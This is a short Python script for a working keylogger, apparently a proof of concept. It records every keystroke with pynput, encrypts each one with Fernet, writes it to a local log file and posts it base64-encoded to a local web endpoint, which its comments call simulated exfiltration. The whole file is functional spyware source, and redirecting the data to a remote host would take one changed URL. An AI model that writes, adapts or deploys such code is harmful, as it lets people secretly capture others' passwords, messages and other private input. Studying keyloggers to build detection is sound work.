import os
from pynput import keyboard
from cryptography.fernet import Fernet
import base64
import datetime
import requests
# Setup encryption key
KEY_FILE = 'encryption_key.key'
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, 'rb') as f:
        KEY = f.read()
else:
    KEY = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(KEY)
fernet = Fernet(KEY)

LOG_FILE = "keys.txt"
KILL_SWITCH = keyboard.Key.esc

def write_encrypted_log(log_data):
    timestamp = datetime.datetime.utcnow().isoformat()
    log_entry = f"{timestamp}: {log_data}\n"
    enc_log = fernet.encrypt(log_entry.encode())

    # Write encrypted log to file
    with open(LOG_FILE, "ab") as f:
        f.write(enc_log + b'\n')

    # Simulate exfiltration (send to local server)
    b64_enc_log = base64.b64encode(enc_log).decode()
    try:
        requests.post('http://127.0.0.1:5000/receive', data={'data': b64_enc_log})
    except requests.exceptions.RequestException:
        pass  # Ignore errors in PoC

def on_press(key):
    try:
        write_encrypted_log(str(key.char))  # Handle normal keys
    except AttributeError:
        write_encrypted_log(str(key))       # Handle special keys
    if key == KILL_SWITCH:
        return False  # Stop listener

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
